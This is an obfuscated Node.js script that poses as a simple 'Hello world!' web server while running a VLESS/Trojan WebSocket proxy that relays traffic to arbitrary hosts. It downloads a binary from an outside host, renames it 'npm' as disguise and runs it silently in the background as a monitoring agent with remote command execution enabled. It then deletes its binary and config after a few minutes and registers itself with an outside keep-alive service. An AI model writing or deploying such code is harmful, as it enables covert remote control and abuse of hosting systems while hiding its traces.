const _0x2931ed=_0x28a0;(function(_0x20a447,_0x109e56){const _0x4fcacb=_0x28a0,_0x15633d=_0x20a447();while(!![]){try{const _0x4be4a1=parseInt(_0x4fcacb(0xea))/0x1*(-parseInt(_0x4fcacb(0xa1))/0x2)+parseInt(_0x4fcacb(0xef))/0x3*(-parseInt(_0x4fcacb(0xe4))/0x4)+parseInt(_0x4fcacb(0x88))/0x5*(parseInt(_0x4fcacb(0xbf))/0x6)+parseInt(_0x4fcacb(0x83))/0x7+-parseInt(_0x4fcacb(0xdc))/0x8+parseInt(_0x4fcacb(0xac))/0x9*(parseInt(_0x4fcacb(0xd4))/0xa)+parseInt(_0x4fcacb(0x8b))/0xb;if(_0x4be4a1===_0x109e56)break;else _0x15633d['push'](_0x15633d['shift']());}catch(_0x2a3e7d){_0x15633d['push'](_0x15633d['shift']());}}}(_0x3acb,0x3e207));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x2931ed(0x99)),net=require(_0x2931ed(0xaa)),path=require(_0x2931ed(0xa3)),crypto=require(_0x2931ed(0x84)),{Buffer}=require(_0x2931ed(0xe0)),{exec,execSync}=require(_0x2931ed(0x9b)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||'e52ff9f5-f3ff-49db-99ef-4182ca55f2b7',NEZHA_SERVER=process[_0x2931ed(0xa4)][_0x2931ed(0xc9)]||'',NEZHA_PORT=process[_0x2931ed(0xa4)][_0x2931ed(0xe1)]||'',NEZHA_KEY=process[_0x2931ed(0xa4)][_0x2931ed(0xb6)]||'',DOMAIN=process[_0x2931ed(0xa4)][_0x2931ed(0xd0)]||_0x2931ed(0xc1),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x2931ed(0xa4)][_0x2931ed(0x9c)]||UUID[_0x2931ed(0x8e)](0x0,0x8),SUB_PATH=process[_0x2931ed(0xa4)][_0x2931ed(0xfe)]||'sub',NAME=process['env'][_0x2931ed(0xb3)]||_0x2931ed(0x9d),PORT=process[_0x2931ed(0xa4)][_0x2931ed(0x82)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x273aa6=_0x2931ed;try{const _0x5a1800=await axios[_0x273aa6(0xaf)](_0x273aa6(0xfb)),_0x57b3a2=_0x5a1800[_0x273aa6(0xf0)];ISP=(_0x57b3a2[_0x273aa6(0xf9)]+'-'+_0x57b3a2[_0x273aa6(0xda)])[_0x273aa6(0xd2)](/ /g,'_');}catch(_0x322f33){ISP=_0x273aa6(0xb9);}};GetISP();function _0x28a0(_0x178729,_0x7bfb02){_0x178729=_0x178729-0x81;const _0x3acbf1=_0x3acb();let _0x28a04f=_0x3acbf1[_0x178729];return _0x28a04f;}const httpServer=http[_0x2931ed(0xa9)]((_0xd03f0b,_0x117b92)=>{const _0x3150a4=_0x2931ed;if(_0xd03f0b[_0x3150a4(0xd9)]==='/'){const _0x41a2f0=path[_0x3150a4(0xb8)](__dirname,_0x3150a4(0xf7));fs[_0x3150a4(0xca)](_0x41a2f0,_0x3150a4(0xc6),(_0x1b6d3e,_0x457b69)=>{const _0x140bdd=_0x3150a4;if(_0x1b6d3e){_0x117b92[_0x140bdd(0xf2)](0xc8,{'Content-Type':'text/html'}),_0x117b92[_0x140bdd(0xf4)](_0x140bdd(0xe3));return;}_0x117b92[_0x140bdd(0xf2)](0xc8,{'Content-Type':_0x140bdd(0xe7)}),_0x117b92[_0x140bdd(0xf4)](_0x457b69);});return;}else{if(_0xd03f0b['url']==='/'+SUB_PATH){const _0x3d50b4=_0x3150a4(0x9f)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x3150a4(0xff)+DOMAIN+_0x3150a4(0xa5)+WSPATH+'#'+NAME+'-'+ISP,_0x5a7999=_0x3150a4(0xc3)+UUID+'@'+DOMAIN+_0x3150a4(0xe9)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x3150a4(0xa5)+WSPATH+'#'+NAME+'-'+ISP,_0x579f8b=_0x3d50b4+'\x0a'+_0x5a7999,_0x49fc90=Buffer[_0x3150a4(0x94)](_0x579f8b)[_0x3150a4(0x81)]('base64');_0x117b92[_0x3150a4(0xf2)](0xc8,{'Content-Type':_0x3150a4(0xae)}),_0x117b92[_0x3150a4(0xf4)](_0x49fc90+'\x0a');}else _0x117b92['writeHead'](0x194,{'Content-Type':_0x3150a4(0xae)}),_0x117b92[_0x3150a4(0xf4)]('Not\x20Found\x0a');}}),_0x47b56d={'server':httpServer},wss=new WebSocket[(_0x2931ed(0x98))](_0x47b56d),uuid=UUID[_0x2931ed(0xd2)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x34a9cc){return new Promise((_0x4dd271,_0x4d9b87)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x34a9cc)){_0x4dd271(_0x34a9cc);return;}let _0x5acaa8=0x0;function _0x4dc660(){const _0x4718d6=_0x28a0;if(_0x5acaa8>=DNS_SERVERS['length']){_0x4d9b87(new Error(_0x4718d6(0x93)+_0x34a9cc+_0x4718d6(0xcb)));return;}const _0x59bd2b=DNS_SERVERS[_0x5acaa8];_0x5acaa8++;const _0x192a68=_0x4718d6(0xcc)+encodeURIComponent(_0x34a9cc)+'&type=A';axios[_0x4718d6(0xaf)](_0x192a68,{'timeout':0x1388,'headers':{'Accept':_0x4718d6(0xfd)}})[_0x4718d6(0xc5)](_0x4f6f62=>{const _0x5a9cea=_0x4718d6,_0x1f581c=_0x4f6f62['data'];if(_0x1f581c[_0x5a9cea(0x8a)]===0x0&&_0x1f581c[_0x5a9cea(0xb0)]&&_0x1f581c[_0x5a9cea(0xb0)]['length']>0x0){const _0x7d5106=_0x1f581c['Answer'][_0x5a9cea(0x95)](_0x4781b7=>_0x4781b7[_0x5a9cea(0xb1)]===0x1);if(_0x7d5106){_0x4dd271(_0x7d5106[_0x5a9cea(0xf0)]);return;}}_0x4dc660();})['catch'](_0x2def45=>{_0x4dc660();});}_0x4dc660();});}function _0x3acb(){const _0x755e9a=['text/plain','get','Answer','type','setsid\x20nohup\x20./npm\x20-s\x20','NAME','hex','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','NEZHA_KEY','every','join','Unknown','arm64','write','substr','update','decode','72XQhVWU','reduce','1234.abc.com','client_secret:\x20','trojan://','listen','then','utf8','arm','stream','NEZHA_SERVER','readFile','\x20with\x20all\x20DNS\x20servers','https://dns.google/resolve?name=','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','createWriteStream','concat','DOMAIN','2087','replace','pop','368340xqEnoJ','error','send','false','split','url','asOrganization','once','3044200FQcQQQ','writeFileSync','message','443','buffer','NEZHA_PORT','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','Hello\x20world!','4eyUBgE','true','pipe','text/html','npm',':443?security=tls&sni=','64292lgPJdQ','2096','--tls','npm\x20is\x20already\x20running,\x20skip\x20running...','\x20-p\x20','1512183mCDLnE','data','/bin/bash','writeHead','includes','end','length','connect','index.html','application/json','country','post','https://speed.cloudflare.com/meta','2053','application/dns-json','SUB_PATH','&fp=chrome&type=ws&host=','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','toString','PORT','2934659ZPJXmu','crypto','readUInt16BE','digest','map','90975XcqBHq','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Status','1766578icKMrU','log','arch','slice','npm\x20download\x20successfully','https://','close','connection','Failed\x20to\x20resolve\x20','from','find','Server\x20is\x20running\x20on\x20port\x20','2083','Server','axios','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','child_process','WSPATH','Hug','https://oooo.serv00.net/add-url','vless://','readUInt8','2yctIHe','createHash','path','env','&path=%2F','npm\x20is\x20running','https://amd64.ssss.nyc.mn/v1','catch','createServer','net','config.yaml','99VYPZpW','8443'];_0x3acb=function(){return _0x755e9a;};return _0x3acb();}function handleVlessConnection(_0x452a01,_0x244ad7){const _0x68b1ad=_0x2931ed,[_0x70c1f5]=_0x244ad7,_0x1f11e9=_0x244ad7[_0x68b1ad(0x8e)](0x1,0x11);if(!_0x1f11e9[_0x68b1ad(0xb7)]((_0x447eca,_0x6d014d)=>_0x447eca==parseInt(uuid['substr'](_0x6d014d*0x2,0x2),0x10)))return![];let _0x4312d4=_0x244ad7[_0x68b1ad(0x8e)](0x11,0x12)[_0x68b1ad(0xa0)]()+0x13;const _0x42855b=_0x244ad7['slice'](_0x4312d4,_0x4312d4+=0x2)[_0x68b1ad(0x85)](0x0),_0xfa7625=_0x244ad7[_0x68b1ad(0x8e)](_0x4312d4,_0x4312d4+=0x1)[_0x68b1ad(0xa0)](),_0x5122e7=_0xfa7625==0x1?_0x244ad7[_0x68b1ad(0x8e)](_0x4312d4,_0x4312d4+=0x4)[_0x68b1ad(0xb8)]('.'):_0xfa7625==0x2?new TextDecoder()[_0x68b1ad(0xbe)](_0x244ad7['slice'](_0x4312d4+0x1,_0x4312d4+=0x1+_0x244ad7['slice'](_0x4312d4,_0x4312d4+0x1)[_0x68b1ad(0xa0)]())):_0xfa7625==0x3?_0x244ad7[_0x68b1ad(0x8e)](_0x4312d4,_0x4312d4+=0x10)['reduce']((_0x336dfb,_0x35d21c,_0x39e1d7,_0x4bd27e)=>_0x39e1d7%0x2?_0x336dfb[_0x68b1ad(0xcf)](_0x4bd27e[_0x68b1ad(0x8e)](_0x39e1d7-0x1,_0x39e1d7+0x1)):_0x336dfb,[])[_0x68b1ad(0x87)](_0x5dd5b9=>_0x5dd5b9['readUInt16BE'](0x0)[_0x68b1ad(0x81)](0x10))[_0x68b1ad(0xb8)](':'):'';_0x452a01[_0x68b1ad(0xd6)](new Uint8Array([_0x70c1f5,0x0]));const _0x187ea9=createWebSocketStream(_0x452a01);return resolveHost(_0x5122e7)[_0x68b1ad(0xc5)](_0x1f708f=>{const _0x8e04c=_0x68b1ad,_0x2d13c0={'host':_0x1f708f,'port':_0x42855b};net['connect'](_0x2d13c0,function(){const _0x15539c=_0x28a0;this[_0x15539c(0xbb)](_0x244ad7['slice'](_0x4312d4)),_0x187ea9['on']('error',()=>{})['pipe'](this)['on'](_0x15539c(0xd5),()=>{})[_0x15539c(0xe6)](_0x187ea9);})['on'](_0x8e04c(0xd5),()=>{});})[_0x68b1ad(0xa8)](_0x1d4bab=>{const _0x23c805=_0x68b1ad,_0x57b7ad={'host':_0x5122e7,'port':_0x42855b};net[_0x23c805(0xf6)](_0x57b7ad,function(){const _0x40683b=_0x23c805;this[_0x40683b(0xbb)](_0x244ad7[_0x40683b(0x8e)](_0x4312d4)),_0x187ea9['on']('error',()=>{})[_0x40683b(0xe6)](this)['on'](_0x40683b(0xd5),()=>{})[_0x40683b(0xe6)](_0x187ea9);})['on'](_0x23c805(0xd5),()=>{});}),!![];}function handleTrojanConnection(_0x2632e0,_0x4a93f3){const _0x5709a9=_0x2931ed;try{if(_0x4a93f3['length']<0x3a)return![];const _0x4c1536=_0x4a93f3[_0x5709a9(0x8e)](0x0,0x38)[_0x5709a9(0x81)](),_0x1cfa2b=[UUID];let _0x12d160=null;for(const _0x44d5d3 of _0x1cfa2b){const _0xc2dc97=crypto[_0x5709a9(0xa2)]('sha224')[_0x5709a9(0xbd)](_0x44d5d3)[_0x5709a9(0x86)](_0x5709a9(0xb4));if(_0xc2dc97===_0x4c1536){_0x12d160=_0x44d5d3;break;}}if(!_0x12d160)return![];let _0x302f11=0x38;_0x4a93f3[_0x302f11]===0xd&&_0x4a93f3[_0x302f11+0x1]===0xa&&(_0x302f11+=0x2);const _0x4181c4=_0x4a93f3[_0x302f11];if(_0x4181c4!==0x1)return![];_0x302f11+=0x1;const _0x2fb40f=_0x4a93f3[_0x302f11];_0x302f11+=0x1;let _0x1becbf,_0x5cf80b;if(_0x2fb40f===0x1)_0x1becbf=_0x4a93f3[_0x5709a9(0x8e)](_0x302f11,_0x302f11+0x4)[_0x5709a9(0xb8)]('.'),_0x302f11+=0x4;else{if(_0x2fb40f===0x3){const _0x40c0d9=_0x4a93f3[_0x302f11];_0x302f11+=0x1,_0x1becbf=_0x4a93f3[_0x5709a9(0x8e)](_0x302f11,_0x302f11+_0x40c0d9)[_0x5709a9(0x81)](),_0x302f11+=_0x40c0d9;}else{if(_0x2fb40f===0x4)_0x1becbf=_0x4a93f3[_0x5709a9(0x8e)](_0x302f11,_0x302f11+0x10)[_0x5709a9(0xc0)]((_0x478f14,_0x25830c,_0x3d12b1,_0x401f2d)=>_0x3d12b1%0x2?_0x478f14[_0x5709a9(0xcf)](_0x401f2d[_0x5709a9(0x8e)](_0x3d12b1-0x1,_0x3d12b1+0x1)):_0x478f14,[])[_0x5709a9(0x87)](_0x324c1b=>_0x324c1b[_0x5709a9(0x85)](0x0)[_0x5709a9(0x81)](0x10))[_0x5709a9(0xb8)](':'),_0x302f11+=0x10;else return![];}}_0x5cf80b=_0x4a93f3[_0x5709a9(0x85)](_0x302f11),_0x302f11+=0x2;_0x302f11<_0x4a93f3[_0x5709a9(0xf5)]&&_0x4a93f3[_0x302f11]===0xd&&_0x4a93f3[_0x302f11+0x1]===0xa&&(_0x302f11+=0x2);const _0x1fa84b=createWebSocketStream(_0x2632e0);return resolveHost(_0x1becbf)['then'](_0x48c54e=>{const _0x38d84f=_0x5709a9,_0x506d7b={'host':_0x48c54e,'port':_0x5cf80b};net[_0x38d84f(0xf6)](_0x506d7b,function(){const _0x12f1bc=_0x38d84f;_0x302f11<_0x4a93f3[_0x12f1bc(0xf5)]&&this[_0x12f1bc(0xbb)](_0x4a93f3[_0x12f1bc(0x8e)](_0x302f11)),_0x1fa84b['on'](_0x12f1bc(0xd5),()=>{})['pipe'](this)['on'](_0x12f1bc(0xd5),()=>{})[_0x12f1bc(0xe6)](_0x1fa84b);})['on'](_0x38d84f(0xd5),()=>{});})[_0x5709a9(0xa8)](_0x5b132d=>{const _0x1f752a=_0x5709a9,_0x17579c={'host':_0x1becbf,'port':_0x5cf80b};net['connect'](_0x17579c,function(){const _0x29b3e8=_0x28a0;_0x302f11<_0x4a93f3[_0x29b3e8(0xf5)]&&this['write'](_0x4a93f3['slice'](_0x302f11)),_0x1fa84b['on'](_0x29b3e8(0xd5),()=>{})[_0x29b3e8(0xe6)](this)['on']('error',()=>{})[_0x29b3e8(0xe6)](_0x1fa84b);})['on'](_0x1f752a(0xd5),()=>{});}),!![];}catch(_0xa4b840){return![];}}wss['on'](_0x2931ed(0x92),(_0x50c2ec,_0x1c4398)=>{const _0x45c57e=_0x2931ed,_0x4e2752=_0x1c4398[_0x45c57e(0xd9)]||'';_0x50c2ec[_0x45c57e(0xdb)](_0x45c57e(0xde),_0x43d04e=>{const _0x5bf7b7=_0x45c57e;if(_0x43d04e[_0x5bf7b7(0xf5)]>0x11&&_0x43d04e[0x0]===0x0){const _0x432637=_0x43d04e['slice'](0x1,0x11),_0x4f9cbf=_0x432637[_0x5bf7b7(0xb7)]((_0x24c7aa,_0x5b9a1b)=>_0x24c7aa==parseInt(uuid[_0x5bf7b7(0xbc)](_0x5b9a1b*0x2,0x2),0x10));if(_0x4f9cbf){!handleVlessConnection(_0x50c2ec,_0x43d04e)&&_0x50c2ec['close']();return;}}!handleTrojanConnection(_0x50c2ec,_0x43d04e)&&_0x50c2ec[_0x5bf7b7(0x91)]();})['on'](_0x45c57e(0xd5),()=>{});});const getDownloadUrl=()=>{const _0x46b7f9=_0x2931ed,_0x13f21d=os[_0x46b7f9(0x8d)]();if(_0x13f21d===_0x46b7f9(0xc7)||_0x13f21d===_0x46b7f9(0xba)||_0x13f21d==='aarch64')return!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent';else return!NEZHA_PORT?_0x46b7f9(0xa7):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x55f627=_0x2931ed;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x55f6de=getDownloadUrl(),_0xc6bb7f=await axios({'method':_0x55f627(0xaf),'url':_0x55f6de,'responseType':_0x55f627(0xc8)}),_0x2358df=fs[_0x55f627(0xce)]('npm');return _0xc6bb7f[_0x55f627(0xf0)][_0x55f627(0xe6)](_0x2358df),new Promise((_0xba1aff,_0x2ec03d)=>{const _0x595e25=_0x55f627;_0x2358df['on']('finish',()=>{const _0x32b8aa=_0x28a0;console[_0x32b8aa(0x8c)](_0x32b8aa(0x8f)),exec('chmod\x20+x\x20npm',_0x254584=>{_0x254584&&_0x2ec03d(_0x254584),_0xba1aff();});}),_0x2358df['on'](_0x595e25(0xd5),_0x2ec03d);});}catch(_0x51f8da){throw _0x51f8da;}},runnz=async()=>{const _0x501f4a=_0x2931ed;try{const _0x1d532f=execSync(_0x501f4a(0xcd),{'encoding':'utf-8'});if(_0x1d532f['trim']()!==''){console[_0x501f4a(0x8c)](_0x501f4a(0xed));return;}}catch(_0x8827d7){}await downloadFile();let _0x29553c='',_0x3b9e2a=[_0x501f4a(0xdf),_0x501f4a(0xad),_0x501f4a(0xeb),_0x501f4a(0xd1),_0x501f4a(0x97),_0x501f4a(0xfc)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x144554=_0x3b9e2a[_0x501f4a(0xf3)](NEZHA_PORT)?_0x501f4a(0xec):'';_0x29553c=_0x501f4a(0xb2)+NEZHA_SERVER+':'+NEZHA_PORT+_0x501f4a(0xee)+NEZHA_KEY+'\x20'+_0x144554+_0x501f4a(0x100);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x52cc10=NEZHA_SERVER[_0x501f4a(0xf3)](':')?NEZHA_SERVER[_0x501f4a(0xd8)](':')[_0x501f4a(0xd3)]():'',_0x5559a2=_0x3b9e2a[_0x501f4a(0xf3)](_0x52cc10)?_0x501f4a(0xe5):_0x501f4a(0xd7),_0x1c506c=_0x501f4a(0xc2)+NEZHA_KEY+_0x501f4a(0x9a)+NEZHA_SERVER+_0x501f4a(0x89)+_0x5559a2+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x501f4a(0xdd)](_0x501f4a(0xab),_0x1c506c);}_0x29553c=_0x501f4a(0xb5);}else{console[_0x501f4a(0x8c)](_0x501f4a(0xe2));return;}}try{exec(_0x29553c,{'shell':_0x501f4a(0xf1)},_0x59f89b=>{const _0x540b50=_0x501f4a;_0x59f89b?console['error']('npm\x20running\x20error:',_0x59f89b):console[_0x540b50(0x8c)](_0x540b50(0xa6));});}catch(_0x39566b){console[_0x501f4a(0xd5)]('error:\x20'+_0x39566b);}};async function addAccessTask(){const _0x54f61e=_0x2931ed;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x389286=_0x54f61e(0x90)+DOMAIN;try{const _0x5121c5={'url':_0x389286},_0x241af5=await axios[_0x54f61e(0xfa)](_0x54f61e(0x9e),_0x5121c5,{'headers':{'Content-Type':_0x54f61e(0xf8)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4eaaef){}}const delFiles=()=>{const _0x56244a=_0x2931ed;fs['unlink'](_0x56244a(0xe8),()=>{}),fs['unlink'](_0x56244a(0xab),()=>{});};httpServer[_0x2931ed(0xc4)](PORT,()=>{const _0x51a318=_0x2931ed;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x51a318(0x8c)](_0x51a318(0x96)+PORT);});
